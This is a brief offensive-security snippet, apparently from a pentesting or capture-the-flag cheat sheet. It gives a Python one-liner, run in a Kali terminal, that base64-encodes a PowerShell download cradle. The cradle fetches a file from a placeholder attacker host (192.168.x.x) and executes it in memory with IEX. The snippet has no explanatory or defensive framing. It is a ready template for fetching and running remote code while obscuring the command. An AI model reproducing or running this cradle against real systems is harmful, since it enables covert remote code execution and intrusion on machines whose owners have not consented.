> Run in kali terminal to encode download cradle:

```
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.x.x/<file>\\') | IEX'.encode('utf-16le')).decode())"
```
